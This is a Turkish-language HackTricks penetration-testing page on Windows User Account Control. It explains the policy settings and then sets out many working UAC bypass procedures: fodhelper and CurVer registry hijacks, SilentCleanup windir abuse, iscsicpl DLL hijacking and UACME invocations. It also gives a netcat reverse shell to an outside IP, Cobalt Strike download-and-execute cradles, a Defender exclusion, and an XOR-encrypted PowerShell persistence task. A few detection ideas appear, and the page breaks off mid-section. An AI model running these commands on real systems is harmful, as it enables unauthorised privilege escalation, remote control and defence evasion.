# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için onay istemi** sağlayan bir özelliktir. Uygulamaların farklı `integrity` seviyeleri vardır ve **yüksek seviyeye** sahip bir program, **sistemin güvenliğini potansiyel olarak tehlikeye atabilecek** görevleri gerçekleştirebilir. UAC etkin olduğunda, bir yönetici bu uygulamaların/görevlerin çalışabilmesi için sisteme yönetici düzeyinde erişime sahip olmasına açıkça izin vermediği sürece, uygulamalar ve görevler her zaman **yönetici olmayan bir hesabın güvenlik bağlamında çalışır**. Bu, yöneticileri istenmeyen değişikliklere karşı koruyan bir kullanım kolaylığı özelliğidir; ancak bir güvenlik sınırı olarak kabul edilmez.<sup>[[2]](#references)</sup>

Integrity seviyeleri hakkında daha fazla bilgi:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC devredeyken, yönetici kullanıcıya 2 token verilir: orta integrity seviyesinde normal işlemleri gerçekleştirmek için standart kullanıcı token'ı ve admin ayrıcalıklarına sahip bir token.

Bu [sayfa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), oturum açma süreci, kullanıcı deneyimi ve UAC mimarisi dahil olmak üzere UAC'nin nasıl çalıştığını ayrıntılı biçimde açıklar.<sup>[[2]](#references)</sup> Yöneticiler, UAC'nin kuruluşlarına özel olarak nasıl çalışacağını yerel düzeyde (secpol.msc kullanarak) güvenlik ilkeleriyle yapılandırabilir veya Active Directory domain ortamında Group Policy Objects (GPO) aracılığıyla yapılandırıp dağıtabilir. Çeşitli ayarlar [burada](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) ayrıntılı olarak ele alınmaktadır. UAC için ayarlanabilen 10 Group Policy ayarı vardır. Aşağıdaki tablo ek ayrıntılar sağlar:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Yerleşik Administrator hesabı için Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Devre dışı)                                             |
| [User Account Control: Admin Approval Mode'daki yöneticiler için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Güvenli masaüstünde Windows dışı binary'ler için onay iste) |
| [User Account Control: Standart kullanıcılar için yükseltme isteminin davranışı](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Güvenli masaüstünde kimlik bilgilerini iste)         |
| [User Account Control: Uygulama yüklemelerini algıla ve yükseltme iste](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Etkin; Enterprise'da varsayılan olarak devre dışı)           |
| [User Account Control: Yalnızca imzalanmış ve doğrulanmış çalıştırılabilir dosyaları yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Devre dışı)                                             |
| [User Account Control: Yalnızca güvenli konumlara yüklenmiş UIAccess uygulamalarını yükselt](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Etkin)                                              |
| [User Account Control: Tüm yöneticileri Admin Approval Mode'da çalıştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Etkin)                                              |
| [User Account Control: UIAccess uygulamalarının güvenli masaüstünü kullanmadan yükseltme istemesine izin ver](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Devre dışı)                                             |
| [User Account Control: Yükseltme istenirken güvenli masaüstüne geç](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Etkin)                                              |
| [User Account Control: Dosya ve registry yazma hatalarını kullanıcı başına konumlarda sanallaştır](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Etkin)                                              |

### Windows'ta software yükleme ilkeleri

**Yerel güvenlik ilkeleri** (çoğu sistemde "secpol.msc"), varsayılan olarak **yönetici olmayan kullanıcıların software yüklemesini engelleyecek** şekilde yapılandırılır. Bu, yönetici olmayan bir kullanıcı software'iniz için installer'ı indirebilse bile, bir admin hesabı olmadan çalıştıramayacağı anlamına gelir.

### UAC'nin yükseltme istemesini zorlamak için Registry Key'leri

Admin hakları olmayan standart bir kullanıcı olarak, "standart" hesabın belirli işlemleri gerçekleştirmeye çalıştığında **UAC tarafından kimlik bilgileri istenmesini** sağlayabilirsiniz. Bu işlem, bir **UAC bypass** mevcut olmadığı veya saldırgan zaten admin olarak oturum açmış olmadığı sürece, admin izinleri gerektiren belirli **registry key'lerinin** değiştirilmesini gerektirir.

Kullanıcı **Administrators** grubunda olsa bile bu değişiklikler, yönetimsel işlemleri gerçekleştirmek için kullanıcının **hesap kimlik bilgilerini yeniden girmesini** zorunlu kılar.

**Pratikte bu yalnızca zaten yükseltilmiş bir token'a, bir UAC bypass'a veya bu key'leri değiştirmenize izin veren bir yanlış yapılandırmaya sahip olduğunuzda işe yarar; aksi takdirde registry yazma işlemi engellenir.**

Değiştirmeniz gereken registry key'leri ve entry'ler (varsayılan değerleri parantez içinde) şunlardır:

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Bu işlem Local Security Policy aracı üzerinden manuel olarak da yapılabilir. Değiştirildikten sonra yönetimsel işlemler, kullanıcının kimlik bilgilerini yeniden girmesini ister.

### Not

**User Account Control bir güvenlik sınırı değildir.** Bu nedenle standart kullanıcılar, local privilege escalation exploit'i olmadan hesaplarından çıkıp yönetici hakları elde edemez.

### Bir kullanıcıdan 'full computer access' istemek
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode, yüksek bütünlük düzeyindeki işlemlerin (web browser'lar gibi) düşük bütünlük düzeyindeki verilere (geçici Internet files klasörü gibi) erişmesini önlemek için bütünlük kontrollerini kullanır. Bu işlem, browser'ı düşük bütünlük seviyesine sahip bir token ile çalıştırarak gerçekleştirilir. Browser, düşük bütünlük bölgesinde depolanan verilere erişmeye çalıştığında işletim sistemi işlemin bütünlük seviyesini kontrol eder ve erişime uygun şekilde izin verir. Bu özellik, remote code execution saldırılarının sistemdeki hassas verilere erişmesini önlemeye yardımcı olur.
- Bir user Windows'ta log on olduğunda sistem, user'ın privileges listesini içeren bir access token oluşturur. Privileges, user'ın rights ve capabilities kombinasyonu olarak tanımlanır. Token ayrıca user'ın credentials listesini de içerir; bunlar user'ı bilgisayara ve network üzerindeki kaynaklara authenticate etmek için kullanılır.

### Autoadminlogon

Windows'u başlangıçta belirli bir user ile otomatik olarak log on olacak şekilde yapılandırmak için **`AutoAdminLogon` registry key** değerini ayarlayın. Bu, kiosk ortamları veya testing amaçları için kullanışlıdır. Password'u registry'de açığa çıkardığından bunu yalnızca güvenli sistemlerde kullanın.

Aşağıdaki key'leri Registry Editor veya `reg add` kullanarak ayarlayın:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Normal logon davranışına dönmek için `AutoAdminLogon` değerini 0 olarak ayarlayın.

## UAC bypass

> [!TIP]
> Victim'a graphical access erişiminiz varsa UAC bypass işleminin oldukça straightforward olduğunu unutmayın; UAC prompt göründüğünde basitçe "Yes" seçeneğine tıklayabilirsiniz.

UAC bypass şu durumda gereklidir: **UAC aktiftir, process'iniz medium integrity context içinde çalışmaktadır ve user'ınız administrators group üyesidir**.

UAC en yüksek security level olan (Always) seviyesindeyse, diğer seviyelerden (Default) herhangi birinde olduğundan **bypass edilmesinin çok daha zor** olduğunu belirtmek önemlidir.

### Medium-integrity shell'den hızlı triage

Bir bypass denemeden önce doğru senaryoda olduğunuzu doğrulayın ve host build'ini bilinen çalışan method'larla eşleştirin:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Pratik notlar:
- `EnableLUA=0` ise bir bypass gerekmez: herhangi bir admin token doğrudan high integrity talep edebilir.
- `ConsentPromptBehaviorAdmin=2` veya `5`, auto-elevate / COM-based bypasses için yaygın senaryodur.
- `Always Notify` çıtayı yükseltir, ancak başarısız olduğunu varsaymak yerine yine de exact build'i test etmelisiniz: UACME, modern Windows build'lerinde hâlâ bazı `AlwaysNotify compatible` methods'i takip eder.<sup>[[3]](#references)</sup>

### UAC devre dışı

UAC zaten devre dışıysa (`ConsentPromptBehaviorAdmin` **`0`**), aşağıdakine benzer bir yöntem kullanarak **admin privileges ile bir reverse shell çalıştırabilirsiniz** (high integrity level):
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Token duplication ile UAC bypass

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Çok** Basit UAC "bypass" (tam file system erişimi)

Administrators grubunun içinde bulunan bir kullanıcıyla bir shell'iniz varsa, SMB üzerinden paylaşılan **C$**'ı yerel olarak yeni bir diske **mount** edebilir ve **file system içindeki her şeye** (hatta Administrator home folder'ına bile) **erişim** sağlayabilirsiniz.

> [!WARNING]
> **Görünüşe göre bu trick artık çalışmıyor**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Cobalt Strike ile UAC bypass

Cobalt Strike teknikleri yalnızca UAC en yüksek güvenlik seviyesine ayarlanmadığında çalışır.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** ve **Metasploit**, **UAC**'yi **bypass** etmek için çeşitli modüllere de sahiptir.

### Yükseltilmiş COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Otomatik olarak yükseltilen COM nesneleri, modern derlemelerde pratik bir UAC yüzeyi olmaya devam etmektedir. `ICMLuaUtil`, güncel Windows dallarında çalıştığı UACME tarafından hâlâ takip edilmektedir ve offensive tooling, COM Elevation Moniker'ı çağırmadan önce etkileşimli bir desktop process, 64-bit execution ve bazen PEB/process masquerading bileşenlerini birleştirerek `CMSTPLUA`'yı uyarlamaya devam etmektedir.<sup>[[3]](#references)</sup>

Practical tips:
- Kullanıcının **interactive session**'ında bir **64-bit** process'i tercih edin (genellikle `explorer.exe` veya onun bir child process'i).
- Ham bir shell başarısız olursa, saf bir `CreateProcess` wrapper'ı yerine bir BOF / UACME implementation üzerinden yeniden deneyin.
- Child execution'ın **ayrı bir elevated process** içinde gerçekleşmesini bekleyin; birçok BOF mevcut beacon'ı yerinde elevate etmez.

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME), UAC bypass tekniklerinden oluşan bir koleksiyondur. Visual Studio veya MSBuild ile derleyin; build birkaç executable oluşturur (örneğin, `Source\Akagi\output\x64\Debug\Akagi.exe`), bu nedenle hedef build için uygun method'u seçin.<sup>[[3]](#references)</sup>\
Dikkatli olun: bazı bypass'ler kullanıcıyı uyarabilecek görünür programlar veya prompt'lar başlatır.<sup>[[3]](#references)</sup>

UACME, her tekniğin çalışmaya başladığı **build version**'a sahiptir.<sup>[[3]](#references)</sup> Sürümlerinizi etkileyen bir tekniği arayabilirsiniz:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ayrıca, [bu](https://en.wikipedia.org/wiki/Windows_10_version_history) sayfayı kullanarak build sürümlerinden Windows release `1607` bilgisini elde edersiniz.

Pratik bir workflow, önce **host build'ini puanlamak**, ardından eşleşen method'u çalıştırmaktır:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage`, yerel build'i bilinen UAC yöntemleriyle hızlıca karşılaştırır; bu da işe yaramayan PoC'leri hızla elemek için kullanışlıdır.<sup>[[4]](#references)</sup>
- `UACME`, bir bypass'ı kesin bir build ile eşleştirmek için hâlâ en iyi public catalogue'dur. 3.7.1 sürümü 83–85 numaralı yöntemleri eklerken, önceki sürüm mevcut yöntemleri **Windows 11 25H2** karşısında yeniden test etti; eski bir PoC'nin değişiklik yapılmadan hâlâ geçerli olduğunu varsaymak yerine yöntem tablosunu ve release notes'u yeniden kontrol edin.<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify uyumlu WNF/UIAccess zincirleri (UACME 3.7.1)

`Always Notify`, her UAC bypass'ını ortadan kaldırmaz. UACME 3.7.1, kullanıcı tarafından kontrol edilen environment/protocol durumunu elevated scheduled-task veya UIAccess davranışıyla birleştiren üç yeni x64 yöntemi uygular ve bunların tümünü `AlwaysNotify compatible` olarak işaretler:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** WNF tarafından tetiklenen `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` görevinde elevated `taskhostw.exe`'nin `unifiedconsent.dll` dosyasını side-load etmesini sağlamak için `SystemRoot`'u yönlendirin. UACME, bu yöntemi Windows 10 build 19041'den itibaren takip eder.
- **84 — TabTip:** Aynı environment-variable primitive'ini UIAccess `TabTip.exe` üzerinde kullanın. Bu işlem build'e bağlı olarak `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` veya `rsaenh.dll` dosyalarından birini yükler; ardından ortaya çıkan high-integrity UIAccess context'inden pivot edin. UACME, bu yöntemi Windows 8.1 / Server 2016'dan itibaren takip eder.
- **85 — Narrator:** Per-user `feedback-hub` protocol'ünü hijack edin, `Alt+CapsLock+F` ile Narrator'ı çalıştırın ve ardından `OskSupport.dll` dosyasını side-load eden, yazılabilir bir `osk.exe` kopyası başlatın. Bu yöntem etkileşimli bir desktop gerektirir ve Windows 10 1809 / Server 2019'dan itibaren takip edilir.

Payload units ve Akagi'yi UACME'de belgelendiği şekilde build ettikten sonra, eşleşen method number'ı çalıştırın (optional command varsayılan olarak `cmd.exe`'dir):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Methods 84 ve 85, UIAccess/desktop interaction özelliğine bağlıdır; bu nedenle Session 0 veya non-interactive service shell üzerinden değişiklik yapılmadan çalışacaklarını varsaymayın. Üçü de environment/protocol state'i değiştirir ve DLL'leri stage eder; implementation'ı inceleyin ve testten sonra bu artifacts'leri kaldırın.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Güvenilen binary `fodhelper.exe`, modern Windows sürümlerinde auto-elevated durumdadır. Başlatıldığında, `DelegateExecute` verb'ünü doğrulamadan aşağıdaki per-user registry path'ini sorgular. Buraya bir command yerleştirmek, Medium Integrity seviyesindeki bir process'in (user Administrators grubundaysa) UAC prompt'u olmadan High Integrity seviyesinde bir process başlatmasına olanak tanır.

fodhelper tarafından sorgulanan registry path:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell adımları (payload'unuzu ayarlayın, ardından tetikleyin)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notlar:
- Geçerli kullanıcı Administrators üyesi olduğunda ve UAC seviyesi varsayılan/gevşek olduğunda çalışır (ek kısıtlamalar içeren Always Notify durumunda çalışmaz).
- 64-bit Windows üzerinde 32-bit bir process'ten 64-bit PowerShell başlatmak için `sysnative` path'ini kullanın.
- Payload herhangi bir command olabilir (PowerShell, cmd veya bir EXE path'i). Stealth için kullanıcı etkileşimi gerektiren arayüzlerden kaçının.

#### CurVer/extension hijack varyantı (yalnızca HKCU)

`fodhelper.exe`'yi kötüye kullanan güncel örnekler `DelegateExecute`'ten kaçınır ve bunun yerine per-user `CurVer` value'su üzerinden **`ms-settings` ProgID'sini yönlendirir**. Auto-elevated binary handler'ı hâlâ `HKCU` altında çözdüğünden, key'leri yerleştirmek için admin token gerekmez:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Yükseltme gerçekleştirildikten sonra malware, `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` değerini `0` olarak ayarlayarak **gelecekteki istemleri devre dışı bırakır**; ardından ek defense evasion işlemleri gerçekleştirir (ör. `Add-MpPreference -ExclusionPath C:\ProgramData`) ve high integrity olarak çalışmak üzere persistence'ı yeniden oluşturur. Tipik bir persistence task, **XOR-encrypted PowerShell script**'ini diskte depolar ve her saat bellekte decode edip çalıştırır:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Bu varyant da dropper'ı temizler ve yalnızca staged payload'ları bırakır; bu nedenle detection, **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion oluşturulması veya PowerShell'i bellekte decrypt eden scheduled task'lerin izlenmesine dayanır.<sup>[[5]](#references)</sup>

### `SilentCleanup` task ile UAC bypass (`HKCU\Environment\windir`)

`SilentCleanup`, `cleanmgr.exe`'yi en yüksek ayrıcalıklarla başlatır ve `%windir%` değerini kullanıcı environment'ından genişletir. `HKCU\Environment\windir` değerini kontrol ediyorsanız, bu genişletmeyi arbitrary bir komuta yönlendirerek consent dialog olmadan yüksek bütünlük elde edebilirsiniz.<sup>[[8]](#references)</sup> UACME tekniği aktif tutmaya devam ettiğinden ve güncel issue tracking, Windows 11 24H2'nin yalnızca küçük quoting ayarlamaları gerektirebileceğini gösterdiğinden, bu yöntem recent build'lerde hâlâ test edilmeye değerdir.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Derleme üzerindeki görev yolu tırnak içine alıyorsa payload'ı tırnakla bitecek şekilde yeniden deneyin (örneğin `cmd.exe"`). Test sonrasında `HKCU\Environment\windir` değerini her zaman temizleyin.

#### Daha fazla UAC bypass

UI akışlarını, COM nesnelerini veya masaüstü etkileşimini kötüye kullanan birçok klasik UAC bypass yöntemi, kurbanla **tam etkileşimli bir oturum** gerektirir; yaygın bir `nc.exe` shell'i veya **Session 0** içinde çalışan bir servis çoğu zaman yeterli değildir.

Bunu genellikle bir **meterpreter** oturumu kullanarak çözebilirsiniz. **Session** değeri **1** olan bir **process**'e migrate edin:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ çalışmalıdır)

### GUI ile UAC Bypass

Bir **GUI**'ye erişiminiz varsa, UAC istemi göründüğünde **kabul edebilirsiniz**; teknik bir bypass'a gerçekten ihtiyacınız yoktur. Bu nedenle bir GUI oturumu elde etmek, UAC'nin eklediği pratik engeli aşmak için çoğu zaman yeterlidir.

Ayrıca birinin kullandığı bir GUI oturumu elde ederseniz (potansiyel olarak RDP üzerinden), **administrator olarak çalışıyor olacak bazı araçlar** bulunabilir. Bu araçlar üzerinden, örneğin bir **cmd**'yi doğrudan **admin olarak çalıştırabilir** ve UAC tarafından tekrar uyarılmadan çalıştırabilirsiniz; örneğin [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Bu biraz daha **stealthy** olabilir.

### Gürültülü brute-force UAC bypass

Gürültü kabul edilebilirse [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) gibi bir tool, kullanıcı kabul edene kadar tekrar tekrar elevation isteğinde bulunabilir.

### Kendi bypass'ınız - Basic UAC bypass metodolojisi

**UACME**'ye bakarsanız, **birçok UAC bypass yönteminin DLL hijacking'i kötüye kullandığını** fark edersiniz (genellikle elevated bir binary'ye, writable bir path içinden saldırgan kontrollü bir DLL yükleterek). [Bir DLL hijacking zafiyetini nasıl bulacağınızı öğrenmek için bunu okuyun](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate** olacak bir binary bulun (çalıştırıldığında high integrity level'da çalıştığını kontrol edin).
2. Procmon ile **DLL Hijacking** için zafiyet içerebilecek "**NAME NOT FOUND**" event'lerini bulun.
3. Muhtemelen DLL'i, yazma izninizin olmadığı bazı **protected path**'lerin (örneğin C:\Windows\System32) içine **write** etmeniz gerekecektir. Bunu şu yöntemleri kullanarak aşabilirsiniz:
1. **wusa.exe**: Windows 7,8 ve 8.1. Bu tool, high integrity level'da çalıştırıldığı için bir CAB file'ın içeriğini protected path'lerin içine çıkarmanıza izin verir.
2. **IFileOperation**: Windows 10.
4. DLL'inizi protected path'in içine kopyalayacak ve zafiyetli, autoelevated binary'yi çalıştıracak bir **script** hazırlayın.

### Başka bir UAC bypass tekniği

Bir **autoElevated binary**'nin çalıştırılacak bir **binary** veya **command**'in **name/path** bilgisini **registry**'den **read** etmeye çalışıp çalışmadığını izlemekten oluşur (binary bu bilgiyi **HKCU** içinde arıyorsa bu daha ilginçtir).

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack ile UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe`, search order kullanarak `iscsiexe.dll` yüklemesi için kötüye kullanılabilecek **auto-elevated** bir binary'dir. Kötü amaçlı bir `iscsiexe.dll` dosyasını **user-writable** bir klasöre yerleştirebilir ve ardından mevcut user `PATH`'ini (örneğin `HKCU\Environment\Path` üzerinden), bu klasörün aranmasını sağlayacak şekilde değiştirebilirseniz Windows, UAC istemi göstermeden attacker DLL'ini elevated `iscsicpl.exe` process'i içine yükleyebilir.<sup>[[1]](#references)[[6]](#references)</sup>

Pratik notlar:
- Bu yöntem, mevcut user **Administrators** grubundaysa ancak UAC nedeniyle **Medium Integrity** seviyesinde çalışıyorsa kullanışlıdır.
- Bu bypass için ilgili olan kopya **SysWOW64** kopyasıdır. **System32** kopyasını ayrı bir binary olarak değerlendirin ve davranışını bağımsız olarak doğrulayın.
- Primitive, **auto-elevation** ile **DLL search-order hijacking** birleşiminden oluşur; bu nedenle diğer UAC bypass yöntemleri için kullanılan aynı ProcMon workflow'u, eksik DLL yüklemesini doğrulamak için faydalıdır.

Minimal akış:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Tespit fikirleri:
- `reg add` / registry writes işlemlerini `HKCU\Environment\Path` konumuna ve hemen ardından `C:\Windows\SysWOW64\iscsicpl.exe` çalıştırılmasına karşı uyarı oluşturacak şekilde izleyin.
- `%TEMP%` veya `%LOCALAPPDATA%\Microsoft\WindowsApps` gibi **kullanıcı tarafından kontrol edilen** konumlarda `iscsiexe.dll` dosyasını arayın.
- `iscsicpl.exe` başlatmalarını, normal Windows dizinlerinin dışından gelen beklenmeyen child process'ler veya DLL yüklemeleriyle ilişkilendirin.

### Ayrı olarak incelenmeye değer daha yeni araştırmalar

2024 sonrası bazı chain'ler artık klasik `HKCU\Software\Classes` registry hijack'lerine benzemiyor. Örneğin activation-context cache poisoning; **drive remap** ve **DLL redirection** işlemlerini birleştirerek `ctfmon.exe` gibi trusted UI / auto-elevated binary'ler ve daha sonraki `fodhelper.exe` gibi hedefler üzerinden medium integrity'den high integrity'ye geçiş sağlayabilir. Büyük PoC'yi burada tekrar etmek yerine aşağıdaki compact payload örneklerini inceleyin:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview) drive-letter hijack via per-logon-session DOS device map

> [!NOTE]
